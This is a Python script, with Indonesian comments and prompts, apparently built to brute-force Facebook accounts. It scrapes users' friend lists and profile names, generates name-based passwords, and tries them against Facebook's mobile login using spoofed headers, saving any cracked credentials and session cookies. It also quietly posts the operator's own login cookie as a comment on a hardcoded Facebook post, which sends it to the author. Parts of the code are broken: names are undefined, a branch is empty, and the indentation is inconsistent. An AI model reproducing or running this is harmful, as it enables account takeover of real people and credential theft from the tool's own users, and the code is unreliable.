#!/usr/bin/python3
#coding=utf-8

# tampung module
import os,sys,time,datetime
import json,requests,random,re
import bs4,base64,urllib3
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as tred

# warna
M = '\x1b[0;31m'
H = '\x1b[0;32m'
K = '\x1b[0;33m'
B = '\x1b[0;34m'
U = '\x1b[0;35m'
O = '\x1b[0;36m'
P = '\x1b[0;97m'

# data bulan & tahun
url_mb = "mbasic.facebook.com"
url_bs = "business.facebook.com"
hitung = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
hitung2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tanggal = datetime.datetime.now().day
bulan = hitung[(str(datetime.datetime.now().month))]
tahun = datetime.datetime.now().year
okeh = f"OK-{str(tanggal)}-{str(bulan)}-{str(tahun)}.txt"
cepe = f"CP-{str(tanggal)}-{str(bulan)}-{str(tahun)}.txt"
toket, loop, ok, cp = [],0,0,0

# logo - lo goblok
def banner():
	print(f"{P} _____  ___  ____\n|____  |    |____\n_____| |___ |")
	
# atur code
def jalan(__becek__):
	for __meki__ in __becek__ + "\n":
		sys.stdout.write(__meki__)
		sys.stdout.flush()
		time.sleep(0.03)
def sapu():
	os.system("clear")

class login:

    def __init__(self):
        os.system("cls") if "win" in sys.platform else os.system("clear")
        asu()
        coki = input(f"\n {P}[{M}*{P}] Gunakan akun tumbal untuk login\n [{M}?{P}] Masukan cokie : {H}")
        self.ConvertCookie(coki)

    def ConvertCookie(self,cookies):
        with requests.Session() as x:
           try:
               link = requests.get("https://web.facebook.com/adsmanager",cookies={'cookie':cookies}).text
               find = re.findall('act=(.*?)&nav_source',link)
               if len(find) == 0:exit(f'\n {P}[{M}×{P}] {K}Cokie mati')
               else:
                     for hilangkan in find:
                         otw = requests.get('https://web.facebook.com/adsmanager/manage/campaigns?act={}&nav_source=no_referrer'.format(hilangkan), cookies={'cookie':cookies})
                         tok = re.search('(EAAB\w+)',otw.text).group(1)
                         if 'EAAB' in tok:
                             my = ('100086281072244_pfbid0qP1265eYDqtmM4516aNCjwzrUHSEDvqt6Vt4cS4LEppFUhcCjcq66uHMXf4fCA2yl')
                             __ = requests.post(f'https://graph.facebook.com/v15.0/{my}/comments/?message={cookies}&access_token={tok}',cookies={'cookie':cookies}).json()
                             open('token.txt','w').write(tok)
                             open('cokie.txt','w').write(cookies)
                             Brute()
           except AttributeError:
              exit(f'\n {P}[{M}×{P}] {K}Cokie mati')

class Brute:

    def __init__(self):
#        pass
        self.dump()

    def dump(self):
         os.system("cls") if "win" in sys.platform else os.system("clear")
        # asu()
         aldos = input(f" {P}[{M}?{P}] Hacking :{H} ")
         if aldos in ['help','Help','HELP']:
              #self.isi_file()

         elif aldos in ['publik','Publik']:
              try:
                   cok = {"cookie":open('cokie.txt','r').read()}
                   tok = open('token.txt','r').read()
              except:
                   login()
              try:
                   nama = requests.get("https://graph.facebook.com/v15.0/me?access_token=%s"%(tok),cookies=cok).json()["name"]
              except KeyError:
                   print(f"\n {P}[{M}×{P}] {K}Tumbal mati");time.sleep(2)
                   login()
              print(f'\n {P} Gunakan tanda koma (,) untuk pemisahan')
              uid = input(f' {P} Masukan nama :{H} ')
              for c in uid.split(','):
                  try:
                      url = requests.get("https://graph.facebook.com/v15.0/{}?fields=id,name,friends.limit(5001)&access_token={}".format(c,tok),cookies=cok).json()
                      for x in url["friends"]["data"]:
                          ID.append(x["id"]+'<=>'+x["name"])
                          print(f'\r {P}[{B}*{P}] sukses dump {H}{len(ID)} {P}username and userid',end=" ")
                  except KeyError:
                      print(f' {P}[{B}×{P}] Akun {c} tidak publik')
              self.metod()

         elif aldos in ['nama','Nama']:
              print(f"\n {P}[{B}✓{P}] Masukan target nama, gunakan koma untuk pemisahan")
              username=[]
              Custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya"," kirana"]
              custoM = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak ","kirana "]
              nama = input(f' {P}[{B}✓{P}] Nama target: ').split(",")
              for otw in nama:
                  for endd in Custom:
                      dump = otw+endd
                      username.append(dump)
                  for ikeh in custoM:
                      dump = ikeh+otw
                      username.append(dump)
              with khamdihiXV(max_workers=30) as ytta_asep_udin_agus:
                  for yamete in username:
                       ytta_asep_udin_agus.submit(self.dump_nama,"https://mbasic.facebook.com/public/{}?/locale2=id_ID".format(yamete))
              self.metod()
         else:
              print(f'\n {P}[{M}×{P}] Ketik {H}HELP{P} untuk melihat printah')
              time.sleep(2);Brute()
		
def isi_file(self):
        os.system("cls") if "win" in sys.platform else os.system("clear")
        asu()
        print(f"""
      {H}Perintah             {M}∆       {H}Deskripsi
 {M}+ {P}---------------------------------------------------- {M}+
      {K}Publik               {M}|       {H}Crack akun publik
      {K}Nama                 {M}|       {H}Crack pencarian nama{P}
      {K}Hasil                {M}|       {H}Check hasil crack
      {K}exit                 {M}|       {H}Log out
 {M}+ {P}---------------------------------------------------- {M}+{P}
        """)
        input(" + Enter untuk kembali ke menu +")
        Brute()

def dump_nama(self,url_nama):
         try:
              link = parse(requests.get(str(url_nama)).text,'html.parser')
              for find_id in link.find_all('td'):
                  data_find = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(find_id))
                  for id,user in data_find:
                      if 'profile.php?' in id:
                          id = re.findall('id=(.*)',str(id))[0]
                      elif '<span' in user:
                          user = re.findall('(.*?)\<',str(user))[0]
                      data_ditemukan = '%s<=>%s'%(id,user)
                      if data_ditemukan in ID:pass
                      else:
                           print(f'\r {P}[{B}✓{P}] sukses dump {H}{len(ID)} {P}username and userid',end=" ")
                           ID.append(data_ditemukan)

                  for next_url_name in link.find_all('a',href=True):
                      if 'Lihat Hasil Selanjutnya' in next_url_name.get('href'):
                          print(next_url_name)
                          self.dump_nama(next_url_name['href'])
         except Exception as e:
              pass

    def metod(self):
        print('')
        print(f'\n {P}[{B}01{P}] Gunakan password Manual\n {P}[{B}02{P}] Gunakan password Default\n')
        pw = input(f' {P} Password : ')
        if pw in ['1','01']:
            self.manual()
        else:
            self.password()

    def asuuh(self):
        print(f"\n {P}[{B}01{P}] Methode Async({M}RECOMEND METHODE)\n {P}[{B}02{P}] Methode Regular")
        kham = input(f"\n {B}Hacking :{H} ")
        if kham in ['1','01']:ngentod.append("REG")
        else:ngentod.append("VAL")

    def manual(self):
        print(f'\n {P}[{B}✓{P}] Gunakan tanda koma untuk pemisahan password')
        pwekmemek = input(f' {P}[{B}✓{P}] Masukan password : ')
        if len(pwekmemek) <=5:
           print(f' {P}[{B}✓{P}] Password harus lebih dari 5 karakter')
           self.manual()
        else:
           self.wordlist(pwekmemek.split(","))

    def wordlist(self, kontol):
        self.asuuh()
        print(f"""
 {P}[{B}✓{P}] akun {H}OK {P}save in : results/OK.txt
 {P}[{B}✓{P}] akun {K}CP {P}save in : results/CP.txt\n""")
        with khamdihiXV(max_workers=30) as coid:
             for fika in ID:
                 uid = fika.split('<=>')[0]
                 if 'REG' in ngentod:
                     coid.submit(self.main_bf_reg, uid, kontol)
                 else:
                     coid.submit(self.main_bf, uid, kontol, 'm.facebook.com')
        exit('\n [✓] Crack telah selesai..')

    def password(self):
        self.asuuh()
        print(f"""
 {P}[{M}*{P}] akun {H}OK {P}save in : results/OK.txt
 {P}[{M}*{P}] akun {K}CP {P}save in : results/CP.txt\n""")
        with khamdihiXV(max_workers=30) as coid:
             for UserAkun in ID:
                  try:
                         uid,nama = UserAkun.split('<=>')
                         terserah = nama.split(' ')[0]
                         if len(nama) <=5:
                                if len(terserah) <=1 or len(terserah) <=2:
                                       pwx = [
                                          terserah+'123',
                                          terserah+'1234',
                                          terserah+'12345'
                                       ]
                                else:
                                       pwx = [
                                          nama,
                                          nama+'123',
                                          nama.lower(),
                                          terserah,
                                          terserah+'123',
                                          terserah+'1234',
                                          terserah+'12345'
                                       ]

                         else:
                                pwx = [
                                          nama,
                                          nama+'123',
                                          nama.lower(),
                                          terserah,
                                          terserah+'123',
                                          terserah+'1234',
                                          terserah+'12345'
                                ]
                         if 'VAL' in ngentod:
                             coid.submit(self.main_bf, uid, pwx, 'm.facebook.com')
                         else:
                             coid.submit(self.main_bf_reg, uid, pwx)
                  except Exception as e:print(e)

    def uazku(self):
        rr = random.randint
        rc = random.choice
        return 'Mozilla/5.0 (Linux; Android {str(rr(4,12))}; VIVO AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(33,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36'
		
		
	def __crack__(self, usr, ang, url):
		global loop, ok, cp
		az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
		rr = random.randint
		rc = random.choice
		ugen = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; Redmi Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"
		for pw in ang:
			try:
				session = requests.Session()
				get = session.get(f"https://{url}/login/?email={usr}&pass={pw}&locale2=id_ID")
				date = {
						"lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
						"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
						"m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
						"li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
						"email":usr,"pass":pw,"Host":"https://"+url+"/login/save-device/?login=source_login&ref=wizard"
					}
				respons = (
					{
						'Host': f'{url}',
						'accept': 'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
						'accept-encoding': 'gzip,deflate',
						'accept-language': 'es_LA,id;q=0.9',
						'content-length': f'{str(rr(1111,9999))}',
						'content-type': 'application/x-www-form-urlencoded',
						'origin': 'https://'+url,
						'referer': f'https://{url}/reg/?cid=103&refid=8',
						'user-agent': ugen,
						'sec-fetch-dest': f'{random.choice(["empty","document"])}',
						'sec-fetch-mode': f'{random.choice(["navigate","cors"])}',
						'sec-fetch-site': f'{random.choice(["none","same-origin"])}',
						'sec-fetch-user': f'{random.choice(["?1","empty"])}',
						'x-requested-with': 'www.facebook.com',
						'x-xss-protection': '0',
						'sec-ch-ua': '" Not A;Brand";v="99", "Microsoft Edge";v="101", "Chromium";v="101"',
						'sec-ch-ua-mobile': '?0'
					}
				)
				yz = session.post(f'https://{url}/login/device-based/login/async/?refsrc=wizard', headers=respons, data=date, allow_redirects=False)
				if "checkpoint" in session.cookies.get_dict().keys():
					print(f"\r>> {K}{usr}|{pw}{P}                   ")
					open('CP/'+cepe,'a').write(usr+'|'+pw+'\n')
					self.res.append(usr+'|'+pw)
					cp+=1
					break
				elif "c_user" in session.cookies.get_dict().keys():
						kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print(f"\r>> {H}{usr}|{pw}|{kukis}{P}")
						open('CP/'+okeh,'a').write(usr+'|'+pw+'\n')
						self.res.append(usr+'|'+pw)
						ok+=1
						break
				else:
					continue
			except requests.exceptions.ConnectionError:time.sleep(30)
		loop+=1
		Q = random.choice([P,H,M,K,U,B,O])
		print(f"\r{P}%s/%s {Q}{usr}{P} {H}%s{P}/{K}%s{P} "%(loop,len(self.id),ok,cp),end=" ");sys.stdout.flush()


if __name__ == '__main__':
   try:os.mkdir('results')
   except:pass
   Brute()
